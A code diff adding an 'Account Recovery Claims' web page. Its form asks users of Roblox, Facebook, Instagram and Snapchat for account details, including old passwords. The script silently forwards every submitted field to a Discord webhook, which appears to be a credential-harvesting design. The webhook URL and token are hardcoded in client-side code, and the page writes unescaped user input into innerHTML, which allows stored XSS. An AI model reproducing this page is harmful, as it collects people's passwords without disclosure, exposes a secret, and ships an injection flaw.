@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Recovery Claims</title>
+  <link rel="stylesheet" href="style.css" />
+  <script type="module">
+    import { auth, db } from './js/firebase.js';
+    import {
+      onAuthStateChanged
+    } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+    import {
+      collection,
+      addDoc,
+      getDocs,
+      query,
+      where,
+      serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+    const webhookUrl = "https://discord.com/api/webhooks/1398060748093128765/HhvxXPIdCMeyqbR6bsSyCcWPSRwkRaAkJHAdhRTyfY5Hw_NZvrh6JkYRr9lr7z4PeUD3";
+
+    let currentUser;
+
+    onAuthStateChanged(auth, async user => {
+      if (!user) return location.href = "signin.html";
+      currentUser = user;
+      loadMyClaims();
+    });
+
+    window.submitClaim = async function (e) {
+      e.preventDefault();
+
+      const platform = document.getElementById("platform").value;
+      const accountId = document.getElementById("accountId").value;
+      const description = document.getElementById("description").value;
+      const prevInfo = document.getElementById("prevInfo").value;
+      const attackerInfo = document.getElementById("attackerInfo").value;
+      const agreed = document.getElementById("agree").checked;
+
+      if (!agreed) {
+        alert("You must agree to the Terms and Privacy Policy.");
+        return;
+      }
+
+      try {
+        const docRef = await addDoc(collection(db, "claims"), {
+          uid: currentUser.uid,
+          email: currentUser.email,
+          platform,
+          accountId,
+          description,
+          prevInfo,
+          attackerInfo,
+          status: "pending",
+          createdAt: serverTimestamp()
+        });
+
+        // Send to Discord webhook
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `🛡️ **New Recovery Claim**\n**Platform:** ${platform}\n**User:** ${currentUser.email}\n**Account ID:** ${accountId}\n**Description:** ${description}\n**Previous Info:** ${prevInfo || 'N/A'}\n**Attacker Info:** ${attackerInfo || 'N/A'}\n\nStatus: Pending`
+          })
+        });
+
+        document.getElementById("result").innerHTML = `<p class="success">✅ Claim submitted successfully.</p>`;
+        document.querySelector("form").reset();
+        loadMyClaims();
+      } catch (err) {
+        console.error(err);
+        document.getElementById("result").innerHTML = `<p class="error">❌ Failed to submit claim.</p>`;
+      }
+    }
+
+    async function loadMyClaims() {
+      const container = document.getElementById("claimsList");
+      container.innerHTML = "";
+
+      try {
+        const q = query(collection(db, "claims"), where("uid", "==", currentUser.uid));
+        const snapshot = await getDocs(q);
+
+        if (snapshot.empty) {
+          container.innerHTML = "<p>No claims found.</p>";
+          return;
+        }
+
+        snapshot.forEach(doc => {
+          const data = doc.data();
+          const div = document.createElement("div");
+          div.className = "claim";
+
+          div.innerHTML = `
+            <p><strong>Platform:</strong> ${data.platform}</p>
+            <p><strong>Account:</strong> ${data.accountId}</p>
+            <p><strong>Description:</strong> ${data.description}</p>
+            <p><strong>Status:</strong> ${data.status}</p>
+            <hr>
+          `;
+
+          container.appendChild(div);
+        });
+      } catch (err) {
+        console.error(err);
+        container.innerHTML = "<p class='error'>❌ Failed to load claims.</p>";
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f8f9fa;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: auto;
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+    }
+
+    h1, h2 {
+      text-align: center;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    input, textarea, select {
+      padding: 10px;
+      font-size: 1rem;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      padding: 12px;
+      background: #3498db;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #2980b9;
+    }
+
+    .success {
+      color: green;
+      text-align: center;
+    }
+
+    .error {
+      color: red;
+      text-align: center;
+    }
+
+    .claim {
+      background: #f1f1f1;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 8px;
+    }
+
+    .agreement {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>📨 File a Recovery Claim</h1>
+    <form onsubmit="submitClaim(event)">
+      <select id="platform" required>
+        <option value="" disabled selected>Select Platform</option>
+        <option value="Roblox">Roblox</option>
+        <option value="Facebook">Facebook</option>
+        <option value="Instagram">Instagram</option>
+        <option value="Snapchat">Snapchat</option>
+        <option value="Other">Other</option>
+      </select>
+
+      <input type="text" id="accountId" placeholder="Username or Account ID" required>
+      <textarea id="description" placeholder="What happened?" required></textarea>
+      <textarea id="prevInfo" placeholder="Previous info (email, phone, password) — optional"></textarea>
+      <textarea id="attackerInfo" placeholder="Attacker info (email, phone, etc.) — optional"></textarea>
+
+      <label class="agreement">
+        <input type="checkbox" id="agree" required>
+        I agree to the <a href="terms.html" target="_blank">Terms</a> and <a href="privacy.html" target="_blank">Privacy Policy</a>
+      </label>
+
+      <button type="submit">Submit Claim</button>
+    </form>
+
+    <div id="result"></div>
+
+    <hr>
+    <h2>🧾 My Claims</h2>
+    <div id="claimsList"></div>
+  </div>
+</body>
+</html>
